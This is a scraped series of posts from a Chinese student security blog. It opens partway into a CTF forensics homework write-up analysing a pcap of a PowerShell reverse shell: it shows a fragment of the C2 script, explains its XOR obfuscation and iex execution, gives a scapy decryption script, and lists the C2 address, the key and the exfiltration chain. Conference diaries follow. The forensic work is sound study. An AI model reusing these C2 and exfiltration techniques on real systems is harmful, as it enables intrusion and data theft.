([text.encoding]::ASCII).GetBytes($response) $stream.Write($response,0,$response.Length) $stream.Flush() } $client.Close() 應該有不少人是拿到 PowerShell script 就直接拿去 Run，提醒一下在野生環境千萬不要這麼做，因為那等於是你幫駭客執行惡意程式 XDDD （助教非常扼腕應該要把 C\u0026C Server 開著等同學連進來後再幫對方彈個小算盤www） 關於上面這段 code ，總共可以分成兩個部分： 單獨來看 Get-Xor function 其實就是拿 input 和 xor_passwd 做 XOR 運算，其中 xor_password 長度不足的部分就重複 padding，必要時可以開 PowerShell 測試。 要注意的是算出來的字串不一定都是可視字元（也不要直接把 wireshark 的 ASCII 字串手動複製==）。 從 line 13 開始是 C\u0026C Server 連線建立，在送出指令和接收資訊的時候分別做 Get-Xor 混淆，這也是為何 wireshark 有一整段都看不懂的原因。這段 script 其中 iex (Invoke-Expression) 就是執行的部分，有點像 Python eval 這類的容易被駭客濫用的危險功能。 知道混淆方式，那就有辦法還原啦！ 不知道各位是如何把密文 dump 出來，我個人是直接用 Python 把指定封包條件下的字串拿出來的同時順便解密~ 這裡簡單說明一下 scapy 套件的使用方式。 # Python3 \u003e\u003e\u003e from scapy.all import * \u003e\u003e\u003e pkts = rdpcap('./reverse_shell.pcap') # read pcap file \u003e\u003e\u003e type(pkts) # check data tpye \u003cClass 'scapy.plist.PacketList'\u003e \u003e\u003e\u003e pkts[0].show() # use show() or display() to see info in packet ###[ Ethernet ]### dst = ff:ff:ff:ff:ff:ff src = 08:00:27:8c:d3:ad type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0 len = 229 id = 29572 flags = frag = 0 ttl = 128 proto = udp chksum = 0xad76 src = 10.0.2.15 dst = 10.0.2.255 \\options \\ ###[ UDP ]### sport = netbios_dgm dport = netbios_dgm len = 209 chksum = 0x19f0 ( etc. ) \u003e\u003e\u003e pkts[0]['IP'].show() # show spectify field info following ###[ IP ]### version = 4 ihl = 5 tos = 0x0 len = 229 id = 29572 flags = frag = 0 ttl = 128 proto = udp chksum = 0xad76 src = 10.0.2.15 dst = 10.0.2.255 \\options \\ ###[ UDP ]### sport = netbios_dgm dport = netbios_dgm len = 209 chksum = 0x19f0 ( etc. ) \u003e\u003e\u003e pkts[0]['IP'].src # show spectify field info '10.0.2.15' 透過上述的用法就能拿來找指定 info ，以下 code 僅供參考。 from scapy.all import * pkts = rdpcap('reverse_shell.pcap') with open('out.raw', 'w') as f: for p in pkts: if 'IP' in p and ( p['IP'].src == '45.79.159.73' or p['IP'].dst == '45.79.159.73' ): if 'Raw' in p and ( p['TCP'].sport==39637 or p['TCP'].dport==39637 ): #f.write(p['Raw'].load) raw = p['Raw'].load xor_passwd = \"x0R_\" res = \"\" for idx, word in enumerate(raw): res += chr(word ^ ord(xor_passwd[idx%4])) #print(res, end=\"\") f.write(res) 在抓資料的過程順便解密+寫檔，順利的話結果會很~漂~亮~ MacacaHub-result.out 從結果來看可以發現駭客利用受害主機上傳了一份 secret.docx 到 C\u0026C Server，所以下一步我們要把檔案抓出來。 檔案一樣是藏在題目給的封包檔中，我自己在這個環節卡很久，事後聊才發現大部分朋友都是先把 word 檔撈出來XDDD 至於 dump 的方式很多種，但我的方式自認蠻哈扣的，如果有更好的方法歡迎找我交流 QwQ 簡單提一下我當時卡住的點~ 由於打 CTF 偶爾會遇到 MS word 題，因此我的觀念上其 binary 標頭和壓縮檔一樣都是PK，也就是可以透過 unzip 指令把整個 word 拆成很多個 .xml 以及圖片檔案(如果內文有圖片的話)，因此我在整個 pcap 檔一直挖不到自己想像中的答案 … 。 直到我最後自己測試開了一份加密過的 word 才發現完全不是這麼一回事，實際上只要把藏在封包裡的 binary 處理一下就能拿到 word，具體操作如下。 同樣用 Follow \u003e TCP stream 觀察，很容易找到這份看起來就是被處理過的資料，可以透過 File \u003e Export Objects \u003e HTTP... 把指定的封包 dump 出來。 這部分可以從檔案類型 “multipart/form-data” 辨別，然後存成 secret.docx 。 再來","date":"2020-11-03","objectID":"/posts/2020/nsysu-htcf-hw1/:1:2","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x01 Writeup","uri":"/posts/2020/nsysu-htcf-hw1/"},{"categories":["資訊安全 Cyber Security"],"content":"Problem 受害主機的外部(實體) IP位址是? 140.117.169.233 駭客C2主機所使用的IP位址和port? 45.79.159.73:39637 C2主機是哪一家虛擬專屬主機(VPS)提供商所提供的? Linode 可以直接 Google “whois” 線上工具找網域的相關資訊，或是裝套件下指令查詢（如圖） Reverse shell的TCP連線內容是用哪一種加密演算法加密? 加密金鑰是? XOR cipher、x0R_ 受害主機所在的AD域的域名? macaca.lab 受害主機所在的AD域中的IP位址? 192.168.77.30 AD域中的DNS主機的名稱與IP位址? dc.macaca.lab、192.168.77.10 網站產生漏洞原因是? 於網站中存在含有 RCE(Remote Code Execution) 的 command injection 漏洞，且針對輸入的參數並沒有進行格式檢查，導致駭客可以透過植入 C\u0026C 惡意程式洩漏資訊。 上傳洩漏資料的網站所用的port? 42794 flag是? flag{p0w3rsh3ll_1s_funny} ","date":"2020-11-03","objectID":"/posts/2020/nsysu-htcf-hw1/:1:3","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x01 Writeup","uri":"/posts/2020/nsysu-htcf-hw1/"},{"categories":["資訊安全 Cyber Security"],"content":"Extra Note 請嘗試完整說明此次駭客從利用網站漏洞到資料外洩的攻擊事件流程 推測原始網站的功能為 輸入 IP 回傳 Ping IP 的結果，但是由於網站後端並沒有針對輸入進行格式檢查，且存在 RCE 漏洞導致被駭客利用。 駭客攻擊思路如下： 駭客先是使用 dir 指令成功讓網站執行並回傳資訊，確認 RCE 漏洞，再利用 PowerShell 不被 Windows 偵測的特性使用無檔案攻擊，將指令執行至 AD 中的子網域主機。在指令方面，駭客主要建立 C\u0026C Server 連線，並且將輸入指令以及回傳資訊透過 Get-Xor function 進行混淆，用意是增加資安人員在鑑識分析上的困難度。 駭客取得主機執行指令的使用者權限後進行搜集情資，包含查看當前使用者(whoami)、網卡資訊(ipconfig /all)、系統資訊(systeminfo)、列出arp紀錄(arp -a)，查看網域底下其他主機資訊(nslookup)，最後才開始針對目錄進行探索。 駭客從原目錄 C:\\Users\\web\\xampp\\htdocs 逐步移動到 C:\\Users\\web\\Desktop\\_ 發現 passwords.txt 拿到 ftp、docx、sso 三組密碼，同時也在C:\\Users\\web\\Downloads 底下找到 secret.docx，最後透過 PowerShell 指令將該檔案上傳至 C\u0026C Server。 ","date":"2020-11-03","objectID":"/posts/2020/nsysu-htcf-hw1/:1:4","tags":["NSYSU 駭客攻防","CTF-Writeup"],"title":"[NSYSU 駭客攻防] HW 0x01 Writeup","uri":"/posts/2020/nsysu-htcf-hw1/"},{"categories":["生活札記 Free Writing"],"content":" 事隔一個月後還有另外兩場資安相關的 Conference，雖然時間上不算是 Summer Conf.，但我也沒打算再開新系列介紹，所以就繼續在這篇往下更新了 XD ","date":"2020-09-27","objectID":"/posts/2020/2020-summer-conf-p3/:0:0","tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/posts/2020/2020-summer-conf-p3/"},{"categories":["生活札記 Free Writing"],"content":"CISC 全國資訊安全會議 (9/1 - 9/4) @NSYSU 原本也是預計辦在五月的會議，偉哉武漢肺炎各種大延期，這場的定位對我來說比較特別，身在主辦方校又是以工人的身份下場幫忙。和規模上和前幾場相比贊助商少了許多，整體會議稍微陽春一些，今年是第卅屆雖然我不確定之前是否都差不多，但各位工人們都很認真幫忙這倒是真的 :3 會議時間上長達四天，但實際上議程只有中間 Day 2, Day 3 兩天。 Day 1 上午場佈、下午由我們 MacacaHub 以「基礎網頁安全演練」作為 CISC 開場打頭陣（現在想想我還是不解為何要開 Day 1 的行程 …），Day 4 則是活動參訪，分別為爬柴山給猴子看，還有海域純玩水，但由於當時已經有下雨預告的消息，所以取消了 0 人報名的爬山活動（!）。 由於 Day 1 的資安演練是額外活動讓會眾自由報名參加，因此原本 @stavhaygn 設定的目標學生是以大學生/碩士生為主，強調基礎網頁安全演練，結果從後台的表單上看到報名會眾都至少都是碩士生，甚至還有幾位是主管等級讓我們大感意外XD 不過最後證實參與的會眾確實都不是這方面專業的，讓我們連原本預期的進度(XSS)都沒時間細講只能匆匆帶過，就這樣抱著 @stavhaygn 的腿平安度過 Day 1。 發現野生的奧義間諜 Day 2 / Day 3 我的主要工作是和 Lab 學弟搭擋負責 Session A 論文發表的場控/計時/拍照以及協助主持人和 A1 場評審，所以很難花心思認真聽報告QQ 何況我被分配到的 Session 比其他場次的組別硬是多了一組，加上台下 Q\u0026A 實在不受控，想當然爾時間上爆炸不可避ㄏㄏ，工人群組內幾乎只有我回報會晚結束，只能說當個時間管理大師真不容易，老實說只有 10 分鐘要講完一篇研究真的很不夠用，何況包含 Q\u0026A 又要把時間壓得更緊，辛苦各位講者了。 值得一提的還有 Day 2 晚宴在西子灣沙灘會館，雖然從學長的反應看得出應該是已經吃到習以為常了，不過我們也是喝了不少酒（笑） 另外，Day 3 上午有資管系主辦的 CISC CTF，所以我們 MacacaHub 就挽起袖子下場一起玩XDDD 整體難度中間偏易，主要有幾題 Pwn 直接被我忽略XD 其中一題原本要考 CVE-2019-18634，結果因為所有參賽者共用主機，所以當我 Google 完 CVE 後就直接在主機內下history 指令看到前一位參賽者 git pull 下來的 PoC，直接被我拿來提權拿 Flag XDDDDD 還有連續兩題的SQLi，結果同樣--的註解在 SQLi-1 可繞過，但在 SQLi-2 不可行，原本以為是空白繞過沒成功（/**/），結果賽後討論才發現把註解改成//就拿到 flag 了… 原本我一直都穩定位居第四名，最後 40 多分鐘我集中在分析 Windows 的 event log，雖然用事件分析工具花了不少時間把 Powershell 的 command 還原出來但沒有成功執行QQ 賽後聽到 @stavhaygn 用 strings 就把 command dump 出來也沒成功（但至少不用像我還要慢慢還原XD），等回過神結束時才發現掉到第五名，和前一名差不到 50 分… 唔嗯，因為我沒有寫Welcome(50) 笑死XD 反正最後拿了 展露頭角獎 回家~ 順帶一提前三名: @CSY54、@stavhaygn、@MuMu，全部都是南部資安圈熟面孔自己人 ㄏㄏ Day 4 本來應該是安排爬山和海域玩水，由於 Day 2 取消了爬山的部分，但因為海域的部分礙於不能取消，所以我們很多工人都被抓下海(??)強制玩水，甚至我明明沒填表單卻還是被秘書姊姊從後台偷偷報名XDDD 剛好拿CTF撿到的500摳家樂福禮券去買了件泳褲 : / 當天集合時有幾位會眾出現，可能是誤會有爬山活動、又或是以為只有踩踩海灘，總之他們最後都回頭了:)))) 剩下我們 10 來位被迫參加的工人各種玩風帆、獨木舟、趴板其實也蠻愉快的，而且岸邊似乎還有其他旅行團的遊客有點害羞XD 最後我真的菜逼八沒做好防曬整個曬到爆XD ","date":"2020-09-27","objectID":"/posts/2020/2020-summer-conf-p3/:0:1","tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/posts/2020/2020-summer-conf-p3/"},{"categories":["生活札記 Free Writing"],"content":"HITCON 臺灣駭客協會 (9/11 - 9/12) @中研院人文社科館 終於輪到我今年預定的最後一場 Conf.，同時是首次和 Lab 各位一起北上參加活動，某方面來說有點像畢業旅行(?) 這次同樣因為偉哉武漢肺炎的影響，在票種上分成線上 \u0026 實體。 線上的部分是用開源遊戲引擎 minetest 架設的虛擬會場，一整個 minecraft 風格，可惜我這方面並沒有涉獵太深。實體方面就和之前的 Conf. 形式上同樣是以議程為主，只是這場雖然有廠商但沒有大地遊戲，算是省了到處跑的力氣w 第一次做高鐵到南港終點站還蠻新鮮的… 雖然這裡看起來有點荒涼ㄏ 飯店的部分我們住洛基大飯店，個人覺得蠻舒適的，說實在身為台北人實在很難得住到在地飯店 XDDD Day 0 我們在 check in 後晚餐吃 YAYOI，雖然價格上有點小貴但我吃得很開心www 尤其我點的餐點還有附說明書(??) 議程部分的講師已經可以認出很多熟面孔了：@CK、@Birdman、@Adr、@大Alan、@小Alan、@Orange、@Inndy、@ddaa、@yuawn、@Angelboy、@Lays、@Jeffxx，幾乎都是駭客圈的紅人XD 這些大神們場子人都不會太少，尤其 @Orange 再次打穿 Facebook 的主題在 R0 快被塞爆== 在廠商攤位方面，照往例就是到處認親、認識朋友，只是同學把我當許願機拿贈品還稱讚我議程蟑螂… 嗚嗚幹，另外咱們 @stavhaygn 在 UCCU 的主題是數位安全＆實體安全，蠻有趣的挑戰，讓我想起自己小時候筆電袋被父母上鎖時，也是用迴紋針慢慢解鎖ㄏ 其他像是 DEVCORE、BambooFox、TeamT5、中華資安 都有各自的 CTF challenge，所以少了大地遊戲也不怕沒事做。另外 HITCON GIRLS 辦的 “Who is Lily?” OSINT 挑戰也很酷，還需要在 HITCON 現場找人、寄釣魚信件才算完成任務！ 在官方的活動中還有線上密室逃脫，很感謝 AIS3 室友的邀請，找齊四人就在會場的角落玩，甚至還被 iThome 記者拍到寫進新聞裡wwwwww 至於玩法大致上都寫在文章內，比較障礙是我和揪來的學妹都沒有接觸過 minecraft，所以在操作移動上備受關懷ww 至於有沒有拿到 Flag 呢… 我忘記了w 不過有挖到一題 pwn 交給隊友處理，我自己是在不同房間到處亂晃找線索，還有玩 minetest 裡的電腦的踩地雷XD 活動結束後還有無差別槍戰不知道在幹嘛，我只記得我一直掉出場外領便當 : ( 印象中往年都有 HITCON token，今年也不例外。不過由於是用虛擬貨幣，所以對沒有再接觸的朋友很多都懶得操作，所以我社交工程借用身邊同學把官方送的錢包(300 HITCON token)轉到我手上，然後拿去HITCON線上商城買了幾塊電路板，到 Day2 甚至還開放可以購買現場的特色貼紙 … 當然是給他買爆 嘻嘻!! 沒有比較沒有傷害，雖然我是第一次參加 HITCON，但和其他場次相比感覺就是有點…掉漆，先不論少了往年慣例的電路板 challenge、煉蠱大會還開天窗。 Day1 報到的時候發了一個黑盒子沒有給提袋，看到大家都當寶貝到處抱著，結果那個黑盒子不僅是一次性的拆了就壞，而且裡頭都是廠商的 DM … 怪不得 Day2 還能疊成塔拜託大家領走 = w = 總之，還是多少在 HITCON 聽到一些有趣的議題/關鍵字，只差在有沒有時間回去翻QwQ 接下來就是 10 月的 MOPCON，只是已經參加第四年應該寫不出心得了吧XDDDDDD 就醬。 ","date":"2020-09-27","objectID":"/posts/2020/2020-summer-conf-p3/:0:2","tags":["CISC","HITCON"],"title":"[Sharing] 2020 Summer Conf. PART 3","uri":"/posts/2020/2020-summer-conf-p3/"},{"categories":["生活札記 Free Writing"],"content":" 八月的某天大雨後，回家路上隨手一拍。希望明年這個時候也能這麼愜意地拍照QQ 隨著時間邁入八月，頭銜也要換成二字頭了，時間真的過好快… 原本有預計暑假要生一些文章出來，結果暑假行程一不小心排滿了XD 再加上原本Lab的例行事務 \u0026 學長姐口試支援，弄到現在好不容易才告個段落…只好拿找論文的時間寫文章（抹臉 ","date":"2020-08-31","objectID":"/posts/2020/first-graduate-summary/:0:0","tags":["日常閒聊"],"title":"[實驗室雜談 EX] 碩一生活總結","uri":"/posts/2020/first-graduate-summary/"},{"categories":["生活札記 Free Writing"],"content":"碩一甘苦談？ 不確定各位的碩一時期是怎麼度過，但我現在回憶起來感覺還蠻愜意的（?） 咱實驗室的碩一生活重點放在修學分 \u0026 審稿 \u0026 看論文，而我自己還會跑 CTF 之類的活動。 礙於我們老闆實在太忙了，所以開會的頻率越來越低… 前陣子才聊過有恢復常態，結果因為好的武漢肺炎疫情關係，以及六月開始各種活動停咪到現在Zzzzz 不曉得到底該不該慶幸 😅 同時也是因為老闆忙，所以到現在我們還沒修過老闆的課，其中授課教授換人的部分有印度籍老師讓爛英文的我很頭疼QQ 所幸在 Lab 夥伴們的各種 CARRY 下平安度過，感謝各位嗚嗚。 若要挑一門最有心得的課，那應該就是網路安全吧，資管系老師開的資工系資安碩必修。很妙 XD 可想而知大部分都是資管學生居多，老師開學就講明密碼學的部分不會講太深，表示資安碩同學可以不用來聽課超酷，雖然我們還是乖乖到教室自修(???) 然後期中考全部申論題，印象中咱 Lab 只有我的分數炸掉 …果然學店生到哪都是學店生。不過後半學期的 hands-on 和 project 主題都能用網路相關自由發揮蠻有趣的，尤其是還有 CTF 可以打!! 然後我們 MacacaHub 一個衝勁除了拿下第一，還差兩題破臺。 \\ @stavhaygn 教我 / 每次上臺報告都被我們當社課塞很多奇怪的梗圖 XD 能這樣玩的課真的不多，推推~ 學分的部分一年下來修了 23 學分... 距離畢業門檻差 5 學分算蠻拚的 😤 審稿部分聽說不是每個Lab都會有(?) 但個人認為算是不錯的修煉，透過審查(X)找碴(O)他人論文來勉勵自己別犯相同的謬誤，只是偶爾時限太短只能匆匆用 Google translate 啃真的有點可惜。另外有時候是審計畫，而且是頁數hen多的那種，那才真的是直接睡Lab… 沒 我開玩笑ㄉ，通常也不會到很難審，只是會多一件事要忙 XD 剩下時間除了打機之外就是不停找論文看了，說真的到現在也只有個大方向，議題還沒辦法確定。 尤其個人看論文的速度真的頗慢還會分心寫部落格，而且必須一段段拿去丟機翻慢慢啃，曾經試過直接咬原文但成效不彰… 真的是有看沒有懂，最後認命回頭翻成中文，有點擔心會不會因為英文太差無法畢業、嘖。 ","date":"2020-08-31","objectID":"/posts/2020/first-graduate-summary/:1:0","tags":["日常閒聊"],"title":"[實驗室雜談 EX] 碩一生活總結","uri":"/posts/2020/first-graduate-summary/"},{"categories":["生活札記 Free Writing"],"content":"暑假南北趴趴走 這部分本來想開新的一篇介紹，不過金魚腦如我，很多活動內容已經需要用力回想，更不用說技術細節還沒看完嗚嗚，所以就拿來當碩一生活總結的一部分放在這裡當遊記分享 www 總之，拜疫情所賜，延到暑假的活動真的有夠多，讓我幾乎是以週為單位在南北奔波QwQ 同時，有些活動真的都是第一次參加，大學時期真的完全沒有契機讓我這樣一直北上跑活動… 原本這篇會包含以下三篇，但在某次部落格更新拆出來了 =） 2020 Summer Conf. PART 1: AIS3 2020 Summer Camp \u0026 COSCUP 2020 2020 Summer Conf. PART 2: SITCON 2020 \u0026 CYBERSEC 2020 2020 Summer Conf. PART 3: CISC 2020 \u0026 HITCON 2020 ","date":"2020-08-31","objectID":"/posts/2020/first-graduate-summary/:2:0","tags":["日常閒聊"],"title":"[實驗室雜談 EX] 碩一生活總結","uri":"/posts/2020/first-graduate-summary/"},{"categories":["生活札記 Free Writing"],"content":"SITCON 學生計算機年會 (8/8) @中研院人文社科館 AIS3 結束隔天馬上就回高雄開會，隔了一週再度回到台北，有夠忙XD SITCON 是我在大學期間蠻常聽到的 Conference ，無奈我大二轉學跑到 NUK 後比較沒有動力北上參加，今年由於疫情延到暑假（歷年都辦在三月），配合下一個CYBERSEC 活動，當然是參加啦！ 也感謝社群朋友的讓票，還順便幫 @tinytsunami 撿了一張，原本沒搶到票想說到時候再用小額贊助 $1000 的方式拿票QQ 然後，8/8 當天我睡過頭了XDDDD 因為前一天深夜才到台北，家人早上又是 6 點出門，所以我 5:30 起床和他們討論晚上的父親節行程，然後睡回籠覺Zzzz 後來發現遲到直接搭小黃有夠散財，還錯過開幕式 可惡qq 不過事後補看開場動畫真的用心，~~感覺很適合拿來搭音 Game 的 PV ~~，不得不說很佩服這種全部由學生自發起扛起的Conf. ，場面上也看到很多在資訊圈的熟面孔。 活動主要分兩個部分，分別是大地遊戲 \u0026 議程。 先說說大地遊戲好了，簡單講就是透過他們的 APP 和攤位互動，達成賓果連線可以換指定小物。但是由於議程之間的休息時間很短，所以我有放掉幾場花時間和攤位交流，像是AMD飲料店 (??) 還有奧義冰淇淋公司 (???) XDDDDD 題外話 奧義冰淇淋 這張構圖我很喜歡，官方攝影組好強w 不過下午全部連線才發現獎品都發完了，嗚嗚花太多時間聽議程了(雖然也不是壞事)，所以只有拿愛情彩的彩券(但最後也沒中獎)，另外由於大家都連會場的 Wi-Fi，結果有些攤位需要 FB 按讚分享的活動很容易被 ban 掉，我想是 Session 不夠用爆掉了嘖嘖。 再來說說議程，既然是以學生為本的，原本以為應該不會太難懂… 不 我錯了，雖然沒有到完全聽不懂的慘，但也足夠讓我感受到同樣身為學生但技術上的距離感。 簡單介紹幾個有趣的議題： 「第一次做密室逃脫就上手」結合IoT、AI、AR架起來的密室逃脫，整場描述如何用從0開始把每個機關慢慢做起來，其中有一項是很有科技感的儀式台然後用雷射造型掃描進行比對，背後原理是RFID辨識，然後講師說對外行人可以騙說是AI辨識真的快笑死。 「Playing Win32 Like a K!NG ;)」小馬 adr1 講的是UAC Bypass，讓駭客能夠騙過系統拿到高權限，還有系統程式的DLL Hijacking、Path Normalization，附帶幾個小 Demo… 說真的能這麼容易被繞過嗎聽起來也蠻可怕的 = w = 「自己的機房自己蓋！」整理機房的心得，看得出不只是硬體上的採購，系統方面的佈局也需要時間下功夫，另外就是人脈很重要XDDD 有免費的資源可以拿最棒惹嘻嘻。 「我只是個學生，架個網站不想花錢」原本是衝著 Github Page 的其他玩法，不過這場講的是架個縮網址網站並透過各種免費資源搭建，像是拿 Google App Script 作為資料庫進行轉址，一路聽下來感覺我好像不太會用到XD 「就算是新手，有愛就沒把專案做出來，對吧」記得是談學生用業界的分工方式實作專案，包含工程師、設計師、產品經理等等的經驗，不過老實說這場只是被我在R0休息順便聽的（抹臉） 「CDN 網站攻擊 - 這次換駭客當鬼來抓你了」由Mico介紹，備受好評的一場，也是因為這場讓我對CDN有新的認識，原來駭客還能利用 CDN 繞過 WAF，或是間接撈到一些本來應該藏起來的資訊，如果有時間的朋友蠻推薦去看ㄉ，整場聽完發現一堆 domain knowledge 要補QQ 噢對了，還有 Lighting Talk ，老實說聽了三年 MOPCON 的經驗，五分鐘好像不太容易被拔線XD 大家都很會抓時間，這次有場真的吸引到我… 嗯更正，是吸引到全場目光，在 R0 廳的大銀幕玩雲端遊戲真的有夠狂XDDDD 最後還偷偷在塗鴉牆上幫MacacaHub留名ww 總之，整體下來玩得很開心，第一次參加也趁機認識些大神，希望有機會自己能練到和他們差不多的水平\u003e\u003c ","date":"2020-08-19","objectID":"/posts/2020/2020-summer-conf-p2/:0:1","tags":["SITCON","CYBERSEC"],"title":"[Sharing] 2020 Summer Conf. PART 2","uri":"/posts/2020/2020-summer-conf-p2/"},{"categories":["生活札記 Free Writing"],"content":"CYBERSEC 臺灣資安大會 (8/11 - 8/12) @南港展覽館二館 同樣因疫情影響延到暑假為期兩天的 CYBERSEC，由於和 SITCON 事隔兩天。加上 Lab 有派人出差，所以我就把行程排在一起了~ 這場相對前面幾次 Conference，定位上比較面企業商業向，因此從報名到問卷調查常常會問到公司營運相關事項，當然這方面我都拿 Lab 或是 MacacaHub 來填（笑） 整體活動分成 展覽 \u0026 議程 \u0026 CyberLAB。 先來談談 CyberLAB實戰攻防演練，不同於議程的人數，這個比較偏向單場 20 人的小班制教學（一天四場），Day 1 我經過看到那個報名排隊人潮直接打消念頭XDDD 展覽方面和資訊博覽會很像，簡單講就是企業擺攤宣傳各種研發成果，其中不乏看得到一些眼熟的企業，像是趨勢科技、Microsoft、奧義智慧、DEVCORE、中華資安 etc.，而主辦官方加入了大地遊戲的要素，透過和攤位的互動完成對應的條件拿到不同的贈品，先不提光方的贈品很快就被搶完，反倒是每個攤位送的贈品也毫不手軟，看到不少人提的大包小包 …看來大家都是窮到來這裡找資源 絕對不是什麼議程蟑螂 。 透過這場活動我也才意識到其實作純資安的公司還不少，雖然探聽了幾間好像大多都是以接 case 的形式居多，說真的資安這行真的出事才會重視蠻尷尬的QQ 不過從一些議程已經有些單位在推資安框架，整合一些 SOP 做事前防禦，看起來應該還是有蠻大的發展空間。 攤位中印象最深的果然還是奧義智慧吧，不愧是新創的科技公司，攤位活動展示 VR 模擬滲透內網、「Cyber IQ數位帝國保衛戰」答題遊戲、資安小學堂問答遊戲、結合MITRE ATT\u0026CK 知識的 Cyber War 卡牌類桌遊，何況他們還吸收了許多 CTF 圈的人才，能深得我們年輕資訊人的歡迎也是預期之中… 更不用說連衣服的設計上各種致敬新世紀福音戰士 太酷了啦XD 議程方面，原本想為碩論找些「雲端」議題的議程，可惜都沒聽到什麼有趣的技術分享，反而是圍繞在「人為疏失」如何管理權限這一類偏企業向基本觀念的話題，或是各種工商，有點可惜Orz。另外也照慣例跑去聽了小馬的場，只能說那個場地配置…有點酷？聽說是上一場議程時主投影機出問題，所以直接整個會場座位轉90度用副投影幕，導致講者台在觀眾後面，然後小馬跟觀眾同台XDDDDD 在 Day 1 結束我帶著 Lab 同學跑去天瓏書店朝聖，資訊方面藏書多到很好混時間的好地方：） 整體下來CYBERSEC算是個內容蠻豐富的場次，主要是投入的廠商夠多所呈現的場面夠大，同時也是這個暑假拿最多免費周邊的一次（笑） ","date":"2020-08-19","objectID":"/posts/2020/2020-summer-conf-p2/:0:2","tags":["SITCON","CYBERSEC"],"title":"[Sharing] 2020 Summer Conf. PART 2","uri":"/posts/2020/2020-summer-conf-p2/"},{"categories":["生活札記 Free Writing"],"content":"AIS3 新型態資安食物實務課程 (7/27 - 8/2) @NTUST 必須通過 AIS3 Pre-exam 才能參加的資安課程，今年印象中最後錄取 186 名，換句話說就算來自非資安領域的同學，能來參加代表也有一定的實力。課程一共七天，採五天上課＋兩天分組專題報告，而今年的分組類別有 關鍵基礎設施、國家安全、數位鑑識、網頁安全、軟體安全開發，分組的題目會和專題有關，而且要在課餘時間生出來，也因為事前打聽到常常會弄到半夜，所以我在地人還特地申請台科大的宿舍 = w = 然後… 可以從官方的安排感受到 關鍵基礎設施 \u0026 國家安全 投注特別多的心力 XD 當時在 pre-exam 的聊天室聽到 關鍵基礎設施 課程會教內網滲透覺得很有趣，所以我填志願放在第一順位，結果課程主要是以工控系統（ICS）為主的資安議題，伊朗核電廠病毒 Stuxnet 和 2018 台積電產線中毒事件 常常被拿出來鞭(X) 警惕(O)，焦點多圍繞在Modbus 工業領域通訊協定、OPC UA 自動化技術的傳輸協定、SCADA 系統，導致在思考專題題目時相當頭疼，畢竟每個真要做起來規模都不小（或是只用模擬的方式），這裡也感謝組員用力 CARRY，臨時生出針對 Operator 和 PLC 之間的明文傳送，用 訊息識別碼(MAC) 上簽章防 中間人攻擊（Man-in-the-middle attack），也讓我幾乎在旁邊當廢人 QwQ 其他比較有趣的課像是數位鑑識由 @CK 主講的「Chimera APT 攻擊調查：案例及調查手法分享」，印象中為了讓我們聽懂前面補很多 Domain knowledge，結果最後重點反而講得很匆忙稍嫌可惜，不過內容有趣到 @stavhaygn 一度想跳槽到數位鑑識組XD 。Lab 方面教 moloch 分析 .pcap 封包，看來以後除了 Wireshark 又多了一套工具…如果我還記得怎麼用的話。 軟體開發安全由 @Ysc 主講的「開發安全與資安測試」，重點放在自動化、自動化 還有… 自動化!!（正色），真的是講師開頭結尾都在強調的東西XDDD 這門重點放在DevOps的CI/CD（即自動化整合及部署），並加入資安各種自動化檢查測試，形成 DevSecOps 讓整個流程能夠更完善，這也讓我發現身邊有很多常用工具有這方面的應用，包括 GitHub、GitLab、Docker、Jenkins、Docker，真的算是開了眼界，應該是我自己太少接觸哭了。 另外 鄭欣明教授 帶來的實作 4G 偽基地站提取手機IMSI也蠻有趣，只是我們自己用手機找不到IMSI沒辦法驗證（只能挖到IMEI）有點好笑，最後做完我還幫官方提供的電腦裝ASCII水族箱 嘻嘻 所以我說那個內網滲透呢？嗯、他被放在網頁安全由楊鈞皓 How 主講的「紅人演練」，是個很精實的 AD 滲透實作，包含一些提權及橫向滲透，跟我之前的網路安全專題有 87% 像，只是滲透等級又更高了許多，甚至到有點跟不上的程度 XD 最後國家安全唔嗯… 只能說很尷尬，大方向都是都是對網路言論或是資訊進行分析，感覺和這方面有關的台下都… Zzzz 都在念舊上午的紅人演練，看來大家都比較喜歡偏實務演練的課 = w = 結果在無聊之餘在報復性聊天室還出現很多CSS攻擊XDDDD 最後群組就出現這張圖…. 笑死 CSY明明沒參加還是會被信徒拿出來喊 噢對 Day 1 \u0026 2 晚上都由額外的活動，所以晚餐是由奧義贊助…嗯？你問我他們不是賣冰淇淋的嗎，不僅如此，他們還有出過桌遊哩XD 課程共筆的部分可以參考 https://hackmd.io/@AIS3-official/AIS3-2020/，也可以去朝聖一下報復性聊天室，只是現在回去看已經沒那麼精采，當時真的是有些高頻率閃動是看了眼睛會痛 wwwww 大概就是這樣，最後兩天的專題感覺很微妙。還沒報告的組別忙著報告，報告完的多半也無心繼續聽(?) 聽說是從去年改成專題形式，感覺得出來很多人比較想玩 Final CTF，不過值得一提的是，我… 不小心發現網路安全組的釣魚實驗，而且我還是第一個在官方群組反應的，因此對話被節錄放在他們的報告上，某方面也是一種成就達成吧（抹臉 簡言之就是 Official Fake Website domain ais3.org ais3.tw Instagram @ais3tw @ais3org 他們巧妙的把官方的命名不統一對調，並把問卷 QR code 貼在會場各個角落，有種破壞了我們和官方之間的信任感，但也因此有幸認識到游桑和 Tina 兩位大大 www ","date":"2020-08-05","objectID":"/posts/2020/2020-summer-conf-p1/:0:1","tags":["AIS3","COSCUP"],"title":"[Sharing] 2020 Summer Conf. PART 1","uri":"/posts/2020/2020-summer-conf-p1/"},{"categories":["生活札記 Free Writing"],"content":"COSCUP 開源人年會 (8/1 - 8/2) @NTUST 有沒有覺得 COSCUP 的時間有點眼熟 … 嗯沒錯，剛好就是 AIS3 的最後兩天專題報告！而且還同樣都在台科大（大概走路 5 分鐘的距離）XD 所以當我關鍵基礎設施在專題報告 Day 1 上午報完，就開始規劃想聽的議程（下午是國家安全專題），然後偷偷溜出去（笑 攤位的部分，因為 @stavhaygn 在前幾天在 MOPCON 的粉絲頁底下 tag 我開玩笑地説想拿貼紙，結果我翹課過去馬上就被官方認出來，還破例讓我多拿幾張，笑死www 到現在還是不太敢貼在筆電上\u003e///\u003c 除了到處晃晃拿貼紙，我還在官方攤買了酒杯和線材包，被同行友人笑每次翹課都會有收穫（幹w 